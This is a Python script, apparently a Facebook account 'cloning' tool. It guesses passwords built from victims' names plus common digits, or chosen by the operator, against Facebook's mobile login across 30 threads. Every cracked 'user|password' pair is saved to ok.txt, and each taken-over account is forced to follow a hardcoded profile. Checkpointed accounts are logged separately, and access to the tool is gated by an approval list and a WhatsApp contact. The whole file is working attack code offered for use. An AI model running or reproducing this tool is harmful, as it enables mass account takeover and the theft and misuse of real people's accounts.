import os,sys,re,time,random,json,string,requests,bs4
from concurrent.futures import ThreadPoolExecutor as ThreadPool

import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as zubairssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = ("""

  /$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$ 
 /$$__  $$| $$__  $$|_  $$_/| $$__  $$
| $$  \ $$| $$  \ $$  | $$  | $$  \ $$
| $$$$$$$$| $$$$$$$   | $$  | $$$$$$$/
| $$__  $$| $$__  $$  | $$  | $$__  $$
| $$  | $$| $$  \ $$  | $$  | $$  \ $$
| $$  | $$| $$$$$$$/ /$$$$$$| $$  | $$
|__/  |__/|_______/ |______/|__/  |__/
                                      
                                      
                                      
\033[41m\033[1;37m[𝐀𝐁𝐈𝐑]   X   [𝐌𝐀𝐈𝐒𝐇𝐀]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] Admin   : 𝐌𝐃. 𝐀𝐁𝐄𝐃𝐔𝐑 𝐑𝐀𝐇𝐌𝐀𝐍\033[1;32m       │         
\033[1;34m│ [✓] Github  : \033[41m\033[1;37m𝐃4𝐑𝐊-𝐁0𝐘\x1b[0m                │           
\033[1;35m│ [✓] Whtsapp : 01863517912             │           
\033[1;36m│ [✓] Youtube : \x1b[1;32m𝐀𝐁𝐈𝐃 𝐀𝐋𝐋 𝐇𝐔𝐁\x1b[1;97m            │                 
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [𝐀𝐁𝐈𝐑 X 𝐌𝐀𝐈𝐒𝐇𝐀]\x1b[0m    """)

def check():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/D4rk-B0y/a.txt/blob/main/approval').text
    if id in httpCaht:
      print("\033[1;92mYour Token is successfully Approved")
      msg = str(os.geteuid())
      time.sleep(0.3)
      zubair()
      pass
    else:
      print("\x1b[37;1mYour Token :\033[1;92m "+id)
      print('\033[1;97m-----------------------------------------------')
      print("\x1b[1;97mCopy Token and Press Enter")
      os.system('xdg-open https://wa.me/+8801863517912')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()

def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n\033[1;97m-----------------------------------------------')
        print('[%s+%s] \033[1;97mTOTAL OK : %s =>> \033[1;97mok.txt'%(O,O,str(len(ok))))
        print('-----------------------------------------------')
        input(f"\033[1;97mPress Enter To Go Back ")
        zubair()

def zubair():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print('\033[1;93m[1] \033[1;97mStart Cloning')
    print('\033[1;93m[2] \033[1;97mExit ')
    print('\033[1;97m-----------------------------------------------')
    _zubair___ = input('\033[1;93m[•] \033[1;97mChoose : ')
    if _zubair___ in ('1', '01'):
        __xxx__().zubairx(id)
    if _zubair___ in ('2', '02'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def zubairx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('\033[1;93m[•] \033[1;97mFile Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.zubairx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;97m[\x1b[1;96m𝐀𝐁𝐈𝐑X𝐌𝐀𝐈𝐒𝐇𝐀\x1b[1;97m] {loop}\x1b[1;93m/\x1b[1;97m{len(self.id)} \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m{len(ok)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H}[SUCCESSFUL] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('ok.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('cp.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;93m[1] \033[1;97mCrack Auto Pass \033[1;92m{Slow}')
        print('\033[1;93m[2] \033[1;97mCrack Digit Passwords \033[1;92m{3-PASS}')
        print('\033[1;93m[3] \033[1;97mCrack Name + Digit Pass \033[1;92m{3-PASS}')
        print('\033[1;93m[4] \033[1;97mCrack With Fullname Pass \033[1;92m{Fast}')
        print('\033[1;93m[5] \033[1;97mCrack With Fullname+Digit Pass \033[1;92m{Slow}')
        print('\033[1;97m-----------------------------------------------')
        chi = input('\033[1;93m[•] \033[1;97mChoose : \033[1;92m')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with zubairssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+"786", xz[0]+"123", xz[0]+"1122", xz[0]+"12"]
                        else:
                            pwx = [xz[0]+"786", xz[0]+"123", xz[0]+"1122", xz[0]+"12"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            p1 = input('\033[1;97mPass 01 : \033[1;92m')
            p2 = input('\033[1;97mPass 02 : \033[1;92m')
            p3 = input('\033[1;97mPass 03 : \033[1;92m')
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with zubairssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [p1, p2, p3]
                        else:
                            pwx = [p1, p2, p3]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('3', '03'):
            os.system("clear")
            print(logo)
            p1 = input('\033[1;97mName + : \033[1;92m')
            p2 = input('\033[1;97mName + : \033[1;92m')
            p3 = input('\033[1;97mName + : \033[1;92m')
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with zubairssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+p1, xz[0]+p2, xz[0]+p3]
                        else:
                            pwx = [xz[0]+p1, xz[0]+p2, xz[0]+p3]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('4', '04'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with zubairssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1]]
                        else:
                            pwx = [name, xz[0]+xz[1]]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('5', '05'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with zubairssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+xz[1]+"123", xz[0]+xz[1]+"1234", xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786"]
                        else:
                            pwx = [xz[0]+xz[1]+"123", xz[0]+xz[1]+"1234", xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

if __name__=='__main__':
    check()

